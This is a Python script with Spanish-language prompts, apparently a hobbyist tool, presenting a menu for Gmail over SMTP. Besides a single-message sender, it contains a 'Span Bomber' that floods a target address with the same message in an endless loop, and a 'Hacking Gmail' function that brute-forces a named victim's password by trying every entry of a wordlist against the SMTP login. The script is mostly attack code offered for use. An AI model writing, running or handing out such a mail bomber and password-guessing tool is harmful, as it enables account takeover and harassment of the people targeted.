from os import error
import signal
import sys
from smtplib import *
import smtplib
import colorama
import subprocess
from colorama.ansi import Fore, Style
def salida(sig,frame):
    print(Fore.RED + '\n\nsaiendo[!]\n', Style.RESET_ALL)
    sys.exit(1)
subprocess.call('clear', shell=True)
signal.signal(signal.SIGINT, salida )
print("\n\n")
try:   
    file = 'sendmail'
    file_log = open(file, 'r')
    print(Fore.MAGENTA +file_log.read(), Style.RESET_ALL)
    print("\n")
    print(Fore.WHITE + '[Autor del script : Bad]     Yotube: https://www.youtube.com/channel/UCA1SFWyF4PNqlWN_m6HoF3w ', Style.RESET_ALL  )
    print(Fore.YELLOW + "\n\n\n[!] PARA LA FUNCION DEL SCRIPTS SE NECESITA QUE USTED USE UN [GMAIL] QUE TENGA EL SERVICIO [SMTP] ABIERTO [!]\n", Style.RESET_ALL)


except error:
    print('Se necesitan los logos o imaganes :( ')


def Mensaje_individual():
    subprocess.call('clear', shell=True)
    file = 'sendmail'
    file_log = open(file, 'r')
    print(Fore.MAGENTA +file_log.read(), Style.RESET_ALL)
    print("\n")
    print(Fore.LIGHTBLACK_EX + '\n\n[Mensaje Individual]\n\n\n\n')
    username = input(Fore.LIGHTWHITE_EX + 'Su cuenta de Gmil: ')
    password = input(Fore.LIGHTYELLOW_EX + 'Su credencial : ')
    coneccion_SMTP = smtplib.SMTP("smtp.gmail.com: 587")
    coneccion_SMTP.starttls()
    coneccion_SMTP.login(user=username, password=password)
    print(Fore.LIGHTGREEN_EX + "\n\n[+] Sucess\n\n", Style.RESET_ALL)
    destino = input(Fore.WHITE + "\nGmail de destino [!] ")
    print(Fore.YELLOW + "\n\nConeccting Success\n\n", Style.RESET_ALL)
    mensaje=  input("Mensaje [!] ")
    coneccion_SMTP.sendmail(from_addr=username,to_addrs=destino,msg=mensaje)
    print(Fore.LIGHTBLACK_EX + "\n\nEl mensaje se envio correctamente [+]\n\n")
    coneccion_SMTP.quit()

def Mail_Boomber():
    subprocess.call('clear', shell=True)
    file = 'sendmail'
    file_log = open(file, 'r')
    print(Fore.MAGENTA +file_log.read(), Style.RESET_ALL)
    print(Fore.WHITE + '[+] Bomber Gmail\n ')
    username = input(Fore.GREEN + "\n\n\n\nSu usuario : ")
    password = input(Fore.YELLOW + "\nSu credencial: ")
    print(Fore.LIGHTBLACK_EX + '\n\nConectando\n\n', Style.RESET_ALL)
    mensaje=  input(Fore.WHITE + "\nMenssage  [!] ")
    destino = input(Fore.GREEN + "Gmail de destino  [!]\n\n" + Style.RESET_ALL)
    coneccion_SMTP = smtplib.SMTP("smtp.gmail.com: 587")
    coneccion_SMTP.starttls()
    while True:
        coneccion_SMTP.login(user=username, password=password)
        coneccion_SMTP.sendmail(from_addr=username,to_addrs=destino,msg=mensaje)
        print(Fore.RED + '\n------------------------\n[+] Succes :) \n--------------------------\n',Style.RESET_ALL)
def Hacking_Mail():
    subprocess.call('clear',shell=True)
    try:
        file = 'sendmail.gmailhacking'
        file_log = open(file, 'r')  
        print(Fore.LIGHTGREEN_EX + file_log.read(), Style.RESET_ALL )
    except:
        print("Se necesitan los logos :( ")
    print(Fore.RED + '[!] Para esta seccion 3 la victima necesita tener el puerto [Smtp] de su [Gmail] abierto')
    print("\n") 
    print(Fore.CYAN + '\n\nOK [Hacking Gmail]\n')
    username = input(Fore.WHITE +'\nGmail de la victima [!] '+ Style.RESET_ALL)
    file1 = input(Fore.CYAN + 'Directorio o localizacion de su diccionario [!] ' + Style.RESET_ALL)
    file = file1
    passwordX  = open(file, 'r')
    for password in passwordX:
        try:
            coneccion = smtplib.SMTP('smtp.gmail.com: 587')
            coneccion.starttls()
            coneccion.login(user=username, password=password)
            print(Fore.YELLOW +  f'\n\n Connecion succes : {password} ', Style.RESET_ALL)
            break;
        except error:
            print(Fore.RED + f"\n-------------------------\n\n[-] Fail : {password}\n--------------------------", Style.RESET_ALL)

    




print(Fore.BLUE + '\n\n-----------------------------------------------------------------------------------------------',Style.RESET_ALL)
print(Fore.LIGHTCYAN_EX + "1) Gmail Menssge",Style.RESET_ALL)
print( Fore.GREEN +  '2) Gmail Span Bomber',Style.RESET_ALL)
print(Fore.LIGHTMAGENTA_EX + '3) Hacking Gmail', Style.RESET_ALL)
print(Fore.BLUE + "---------------------------------------------------------------------------------------", Style.RESET_ALL)
Mail = int(input(Fore.LIGHTBLACK_EX + "\n\n[!] "))
try:
    if Mail == 1:
     Mensaje_individual()
    if Mail == 2:
        Mail_Boomber()
    if Mail == 3:
        Hacking_Mail()
    while Mail >=4:
        print(Fore.RED + "\m\mIngrese un numero  valido  [!]\n\n ")
        sys.exit(1)
except error:
    print(Fore.RED + "Se necesita que su cueta tenga abierto el servicio smtp, para esto entre a su gmail  y habilite esto : \n en ajustes el  apartado de : [Inicios de session apps inseguras]")















